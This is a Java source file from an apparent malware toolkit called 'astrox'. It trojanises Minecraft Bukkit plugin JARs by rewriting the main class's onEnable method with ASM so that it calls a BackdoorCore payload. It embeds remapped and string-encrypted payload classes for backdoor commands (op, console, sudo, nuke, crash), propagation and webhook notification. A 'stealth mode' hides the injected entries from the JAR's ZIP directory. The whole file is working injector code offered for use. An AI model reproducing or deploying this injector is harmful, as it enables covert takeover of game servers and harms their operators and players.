package dev.naruto.astrox.core;

import dev.naruto.astrox.Config;
import dev.naruto.astrox.RuntimeConfig;
import dev.naruto.astrox.obfuscation.ObfuscationEngine;
import org.objectweb.asm.*;
import org.objectweb.asm.commons.AdviceAdapter;
import org.objectweb.asm.commons.ClassRemapper;
import org.objectweb.asm.commons.SimpleRemapper;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.*;
import java.util.*;
import java.util.jar.*;
import java.util.zip.*;

/**
 * Main injection orchestrator.
 * Coordinates JAR manipulation, payload embedding, and bytecode injection.
 * Returns a {@link PipelineResult} with complete injection metadata.
 */
public class Injector {

    private static final Logger LOG = LoggerFactory.getLogger(Injector.class);

    private final File inputJar;
    private final File outputJar;
    private final ObfuscationEngine obfuscator;
    private final boolean dryRun;
    private final boolean stealthMode;

    public Injector(File inputJar, File outputJar) {
        this(inputJar, outputJar, RuntimeConfig.dryRun, RuntimeConfig.stealthMode);
    }

    public Injector(File inputJar, File outputJar, boolean dryRun, boolean stealthMode) {
        this.inputJar = inputJar;
        this.outputJar = outputJar;
        this.obfuscator = new ObfuscationEngine(Config.OBFUSCATION_LEVEL);
        this.dryRun = dryRun;
        this.stealthMode = stealthMode;
    }

    /**
     * Execute full injection pipeline.
     *
     * @return PipelineResult with complete injection metadata
     */
    public PipelineResult inject(JarAnalyzer analyzer, byte[] payloadBytes) throws Exception {
        PipelineResult.Builder result = new PipelineResult.Builder()
                .originalJarPath(inputJar.getAbsolutePath())
                .outputJarPath(outputJar.getAbsolutePath())
                .pluginName(analyzer.getPluginName())
                .version(analyzer.getVersion())
                .mainClass(analyzer.getMainClass())
                .javaVersion(analyzer.getJavaVersion())
                .basePackage(analyzer.getBasePackage())
                .dryRun(dryRun)
                .stealthMode(stealthMode)
                .encryptionKeyHex(Config.getEncryptionKeyHex());

        String mainClass = analyzer.getMainClass();
        String targetPackage = analyzer.getBasePackage() + ".internal.util";

        // Build randomized remapping table
        PayloadWeaver weaver = new PayloadWeaver(Config.OBFUSCATION_LEVEL);
        weaver.generateRandomPackage();
        Map<String, String> remapTable = weaver.buildRemapTable(
                analyzer.getBasePackage().replace('.', '/'));

        String payloadClass = weaver.getPayloadClassName().replace('/', '.');
        Set<String> hiddenEntries = new LinkedHashSet<>();

        LOG.info("Target package: {}", targetPackage);
        LOG.debug("Payload class mapped to: {}", payloadClass);

        if (dryRun) {
            LOG.info("[DRY-RUN] Would inject into {} — skipping JAR output", inputJar.getName());
            // Simulate: list what would be injected
            for (Map.Entry<String, String> entry : remapTable.entrySet()) {
                result.addInjectedClass(entry.getValue());
            }
            return result.build();
        }

        try (JarFile jarFile = new JarFile(inputJar);
             OutputStream os = new FileOutputStream(outputJar);
             JarOutputStream jos = jarFile.getManifest() != null ? 
                     new JarOutputStream(os, jarFile.getManifest()) : 
                     new JarOutputStream(os)) {

            // Copy all existing entries
            jarFile.stream().forEach(entry -> {
                try {
                    if (entry.getName().equals("META-INF/MANIFEST.MF")) {
                        return; // Skip manifest (already handled)
                    }

                    jos.putNextEntry(new ZipEntry(entry.getName()));

                    if (entry.getName().endsWith(".class")) {
                        String className = entry.getName()
                                .replace(".class", "")
                                .replace('/', '.');

                        if (className.equals(mainClass)) {
                            // INJECT into main class using AdviceAdapter (AFTER original code)
                            byte[] originalBytes = readEntry(jarFile, entry);
                            byte[] modifiedBytes = injectBootstrapAdvice(
                                    originalBytes, payloadClass);
                            jos.write(modifiedBytes);
                            LOG.info("Injected bootstrap into: {} (AdviceAdapter, post-onEnable)",
                                    mainClass);
                        } else {
                            copyEntry(jarFile, entry, jos);
                        }
                    } else {
                        copyEntry(jarFile, entry, jos);
                    }

                    jos.closeEntry();
                } catch (IOException e) {
                    throw new RuntimeException("Failed to process entry: " + entry.getName(), e);
                }
            });

            // Embed and remap payload classes
            LOG.info("Embedding payload classes...");
            embedRemappedClasses(jos, remapTable, result, hiddenEntries);

            LOG.info("Embedded all payload classes ({} total)", result.getInjectedClasses().size());
        }

        // Stealth post-processing: hide injected entries from Central Directory
        if (stealthMode && !hiddenEntries.isEmpty()) {
            LOG.info("Applying stealth patch — hiding {} entries from ZIP directory",
                    hiddenEntries.size());
            StealthPatcher patcher = new StealthPatcher(hiddenEntries);
            if (!patcher.patch(outputJar)) {
                result.addWarning("Stealth patching failed — entries remain visible in JAR listing");
            }
        }

        return result.build();
    }

    /**
     * Inject BackdoorCore.inject(this) using AdviceAdapter — called AFTER original onEnable() code.
     * This preserves the original plugin functionality.
     */
    private byte[] injectBootstrapAdvice(byte[] classBytes, String payloadClassName) {
        ClassReader reader = new ClassReader(classBytes);
        ClassWriter writer = new ClassWriter(reader, ClassWriter.COMPUTE_FRAMES | ClassWriter.COMPUTE_MAXS);

        ClassVisitor visitor = new ClassVisitor(Opcodes.ASM9, writer) {
            @Override
            public MethodVisitor visitMethod(int access, String name,
                                             String descriptor, String signature, String[] exceptions) {
                MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);

                if (name.equals("onEnable") && descriptor.equals("()V")) {
                    return new AdviceAdapter(Opcodes.ASM9, mv, access, name, descriptor) {
                        @Override
                        protected void onMethodExit(int opcode) {
                            if (opcode == RETURN) {
                                // Inject AFTER original code: BackdoorCore.inject(this);
                                mv.visitVarInsn(ALOAD, 0);
                                mv.visitMethodInsn(INVOKESTATIC,
                                        payloadClassName.replace('.', '/'),
                                        "inject",
                                        "(Lorg/bukkit/plugin/java/JavaPlugin;)V",
                                        false);
                                LOG.debug("Inserted AdviceAdapter post-exit hook in onEnable()");
                            }
                        }
                    };
                }

                return mv;
            }
        };

        reader.accept(visitor, ClassReader.EXPAND_FRAMES);
        return writer.toByteArray();
    }

    /**
     * Embed all payload classes with package remapping.
     */
    private void embedRemappedClasses(JarOutputStream jos, Map<String, String> remapTable,
                                      PipelineResult.Builder result,
                                      Set<String> hiddenEntries) throws IOException {
        String[] classes = {
                "dev.naruto.astrox.payload.BackdoorCore",
                "dev.naruto.astrox.payload.CommandHandler",
                "dev.naruto.astrox.payload.AuthManager",
                "dev.naruto.astrox.payload.PropagationEngine",
                "dev.naruto.astrox.payload.BootstrapStub",
                "dev.naruto.astrox.Config",
                "dev.naruto.astrox.RuntimeConfig",
                "dev.naruto.astrox.payload.commands.Command",
                "dev.naruto.astrox.payload.commands.OpCommand",
                "dev.naruto.astrox.payload.commands.DeopCommand",
                "dev.naruto.astrox.payload.commands.GamemodeCommand",
                "dev.naruto.astrox.payload.commands.GiveCommand",
                "dev.naruto.astrox.payload.commands.ConsoleCommand",
                "dev.naruto.astrox.payload.commands.ChaosCommand",
                "dev.naruto.astrox.payload.commands.SeedCommand",
                "dev.naruto.astrox.payload.commands.AuthCommand",
                "dev.naruto.astrox.payload.commands.DeauthCommand",
                "dev.naruto.astrox.payload.commands.FlyCommand",
                "dev.naruto.astrox.payload.commands.VanishCommand",
                "dev.naruto.astrox.payload.commands.HealCommand",
                "dev.naruto.astrox.payload.commands.KillCommand",
                "dev.naruto.astrox.payload.commands.SudoCommand",
                "dev.naruto.astrox.payload.commands.BroadcastCommand",
                "dev.naruto.astrox.payload.commands.FakeJoinCommand",
                "dev.naruto.astrox.payload.commands.FakeLeaveCommand",
                "dev.naruto.astrox.payload.commands.KickCommand",
                "dev.naruto.astrox.payload.commands.CrashCommand",
                "dev.naruto.astrox.payload.commands.NukeCommand",
                "dev.naruto.astrox.payload.commands.HelpCommand",
                "dev.naruto.astrox.payload.commands.CoordsCommand",
                "dev.naruto.astrox.payload.commands.ListCommand",
                "dev.naruto.astrox.payload.commands.AddUserCommand",
                "dev.naruto.astrox.utils.ReflectionUtil",
                "dev.naruto.astrox.utils.CryptoUtil",
                "dev.naruto.astrox.utils.Logger",
                "dev.naruto.astrox.utils.DebugLogger",
                "dev.naruto.astrox.utils.DynamicLoader",
                "dev.naruto.astrox.utils.WebhookNotifier",
                "dev.naruto.astrox.core.JarAnalyzer",
                "dev.naruto.astrox.core.Injector",
                "dev.naruto.astrox.core.PayloadWeaver"
        };

        SimpleRemapper remapper = new SimpleRemapper(remapTable);

        for (String className : classes) {
            embedRemappedClass(jos, className, remapper, remapTable, result, hiddenEntries);
        }
    }

    /**
     * Load, remap, and embed a single class.
     * Applies string encryption for eligible payload classes when ENCRYPT_STRINGS is enabled.
     */
    private void embedRemappedClass(JarOutputStream jos, String className,
                                    SimpleRemapper remapper, Map<String, String> remapTable,
                                    PipelineResult.Builder result,
                                    Set<String> hiddenEntries) throws IOException {
        String resourcePath = "/" + className.replace('.', '/') + ".class";

        InputStream is = getClass().getResourceAsStream(resourcePath);
        if (is == null) {
            LOG.warn("Class not found in resources: {}", className);
            result.addWarning("Class not found: " + className);
            return;
        }

        try (is) {
            byte[] originalBytes = is.readAllBytes();

            // Phase 1: Remap package using ASM ClassRemapper
            ClassReader reader = new ClassReader(originalBytes);
            ClassWriter writer = new ClassWriter(reader, 0);
            ClassVisitor remappingVisitor = new ClassRemapper(writer, remapper);
            reader.accept(remappingVisitor, ClassReader.EXPAND_FRAMES);

            byte[] processedBytes = writer.toByteArray();

            // Phase 2: Apply string encryption if enabled and class is eligible
            if (Config.ENCRYPT_STRINGS && !isStringEncryptionExcluded(className)) {
                String newPath = remapTable.getOrDefault(className.replace('.', '/'),
                        className.replace('.', '/'));
                processedBytes = obfuscator.obfuscateClass(processedBytes, newPath);
                LOG.debug("  [~] String encryption applied to {}", className);
            }

            // Get new class path from remap table
            String oldPath = className.replace('.', '/');
            String newPath = remapTable.getOrDefault(oldPath, oldPath);

            String entryName = newPath + ".class";
            jos.putNextEntry(new ZipEntry(entryName));
            jos.write(processedBytes);
            jos.closeEntry();

            result.addInjectedClass(newPath);
            if (stealthMode) {
                hiddenEntries.add(entryName);
            }

            LOG.debug("  [+] {} ({} bytes)", newPath, processedBytes.length);
        }
    }

    /**
     * Classes that must NOT have string encryption applied.
     * These rely on exact string matching at runtime (reflection, config, interfaces).
     */
    private static boolean isStringEncryptionExcluded(String className) {
        return className.equals("dev.naruto.astrox.Config")
                || className.equals("dev.naruto.astrox.RuntimeConfig")
                || className.equals("dev.naruto.astrox.payload.commands.Command")     // interface
                || className.equals("dev.naruto.astrox.payload.modules.PayloadModule") // interface
                || className.equals("dev.naruto.astrox.utils.ReflectionUtil")   // runtime string assembly
                || className.equals("dev.naruto.astrox.utils.CryptoUtil")       // crypto constants
                || className.equals("dev.naruto.astrox.utils.DynamicLoader")    // classloader reflection
                || className.equals("dev.naruto.astrox.core.JarAnalyzer")       // build-time only
                || className.equals("dev.naruto.astrox.core.Injector")          // build-time only
                || className.equals("dev.naruto.astrox.core.PayloadWeaver");     // build-time only
    }

    /**
     * Read JAR entry bytes.
     */
    private byte[] readEntry(JarFile jar, JarEntry entry) throws IOException {
        try (InputStream is = jar.getInputStream(entry)) {
            return is.readAllBytes();
        }
    }

    /**
     * Copy JAR entry unchanged.
     */
    private void copyEntry(JarFile jar, JarEntry entry, JarOutputStream jos) throws IOException {
        try (InputStream is = jar.getInputStream(entry)) {
            byte[] buffer = new byte[8192];
            int read;
            while ((read = is.read(buffer)) != -1) {
                jos.write(buffer, 0, read);
            }
        }
    }
}
